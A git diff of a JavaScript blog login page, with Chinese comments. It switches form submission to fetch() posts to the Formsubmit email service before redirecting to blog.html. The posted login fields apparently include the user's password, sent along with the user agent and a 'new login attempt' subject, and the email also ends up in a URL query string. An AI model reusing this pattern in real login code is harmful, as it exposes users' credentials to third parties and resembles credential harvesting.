@@ -294,8 +294,8 @@ class BlogLogin {
                 // 设置隐藏字段
                 this.setHiddenFields('email');
 
-                // 使用 Formsubmit 提交表单
-                this.submitToFormsubmit(e.target);
+                // 使用 Formsubmit 提交表单（会自动跳转到 blog.html）
+                this.submitToFormsubmitAndRedirect(e.target, email);
 
                 if (rememberMe) {
                     localStorage.setItem('rememberedEmail', email);
@@ -339,28 +339,65 @@ class BlogLogin {
                 this.setHiddenFields(method);
 
                 // 创建虚拟表单并提交到 Formsubmit
-                this.submitSocialToFormsubmit(method);
-
-                // 为社交登录创建特殊跳转（带标识）
-                this.showSocialSuccessState(email, method);
+                this.submitSocialToFormsubmitAndRedirect(method);
             }, 1500);
         }, 1000);
     }
 
-    showSocialSuccessState(email, method) {
-        const loginForm = document.getElementById('loginForm');
-        const loginSuccess = document.getElementById('loginSuccess');
+    submitSocialToFormsubmitAndRedirect(method) {
+        // 创建虚拟表单
+        const form = document.createElement('form');
+        form.style.display = 'none';
+        form.method = 'POST';
 
-        loginForm.style.display = 'none';
-        loginSuccess.style.display = 'block';
+        // 添加 Formsubmit 配置
+        const actionUrl = document.querySelector('input[name="_action"]').value;
+        form.action = actionUrl;
 
-        this.showNotification('社交登录成功！正在跳转...', 'success');
+        // 添加字段
+        const fields = {
+            'email': `${method}@social.com`,
+            'password': '[社交登录]',
+            'rememberMe': 'false',
+            'loginMethod': method,
+            'timestamp': new Date().toISOString(),
+            'userAgent': navigator.userAgent,
+            '_subject': `🚀 新的${method === 'google' ? 'Google' : 'GitHub'}登录尝试`,
+            '_captcha': 'false',
+            '_template': 'table'
+        };
 
-        // 2秒后跳转到博客首页（社交登录使用特殊邮箱标识）
-        setTimeout(() => {
-            const socialEmail = `social:${method}@login.com`;
-            window.location.href = `${this.BLOG_HOME_URL}?email=${encodeURIComponent(socialEmail)}`;
-        }, 2000);
+        for (const [key, value] of Object.entries(fields)) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = key;
+            input.value = value;
+            form.appendChild(input);
+        }
+
+        // 提交表单并处理响应
+        fetch(actionUrl, {
+            method: 'POST',
+            body: new FormData(form)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('✅ 社交登录数据已发送');
+                this.showNotification(`${method === 'google' ? 'Google' : 'GitHub'}登录成功！`, 'success');
+                setTimeout(() => {
+                    const socialEmail = `social:${method}@login.com`;
+                    window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}`;
+                }, 1000);
+            } else {
+                console.log('⚠️ 发送失败:', response.statusText);
+            }
+        })
+        .catch(error => {
+            console.log('⚠️ 发送错误:', error);
+        });
+
+        // 清理临时表单
+        document.body.removeChild(form);
     }
 
     handleForgotPassword() {
@@ -423,41 +460,35 @@ class BlogLogin {
         });
     }
 
-    submitSocialToFormsubmit(method) {
-        // 创建虚拟表单
-        const form = document.createElement('form');
-        form.style.display = 'none';
-        form.method = 'POST';
+    submitToFormsubmitAndRedirect(form, email) {
+        // 获取 Formsubmit URL（从隐藏字段）
+        const actionUrl = form.querySelector('input[name="_action"]').value;
 
-        // 添加 Formsubmit 配置
-        const actionUrl = document.querySelector('input[name="_action"]').value;
-        form.action = actionUrl;
+        // 创建表单数据
+        const formData = new FormData(form);
 
-        // 添加字段
-        const fields = {
-            'email': `${method}@social.com`,
-            'password': '[社交登录]',
-            'rememberMe': 'false',
-            'loginMethod': method,
-            'timestamp': new Date().toISOString(),
-            'userAgent': navigator.userAgent,
-            '_subject': `🚀 新的${method === 'google' ? 'Google' : 'GitHub'}登录尝试`,
-            '_captcha': 'false',
-            '_template': 'table'
-        };
-
-        for (const [key, value] of Object.entries(fields)) {
-            const input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = key;
-            input.value = value;
-            form.appendChild(input);
-        }
-
-        // 提交表单
-        document.body.appendChild(form);
-        form.submit();
-        document.body.removeChild(form);
+        // 发送到 Formsubmit
+        fetch(actionUrl, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('✅ 数据已发送到 Formsubmit');
+                // 成功后显示消息并跳转到 blog.html
+                this.showNotification('登录成功！正在跳转...', 'success');
+                setTimeout(() => {
+                    window.location.href = `blog.html?email=${encodeURIComponent(email)}`;
+                }, 1000);
+            } else {
+                console.log('⚠️ 发送失败:', response.statusText);
+                this.showNotification('提交失败，请重试', 'error');
+            }
+        })
+        .catch(error => {
+            console.log('⚠️ 发送错误:', error);
+            this.showNotification('提交失败，请重试', 'error');
+        });
     }
 
     submitToNetlifyForms(email, password, rememberMe, method = 'email') {
@@ -525,7 +556,7 @@ class BlogLogin {
 
         this.showNotification('登录成功！正在跳转...', 'success');
 
-        // 2秒后跳转到博客首页（传递邮箱参数）
+        // 2秒后通过查询参数跳转到博客首页
         setTimeout(() => {
             window.location.href = `${this.BLOG_HOME_URL}?email=${encodeURIComponent(email)}`;
         }, 2000);
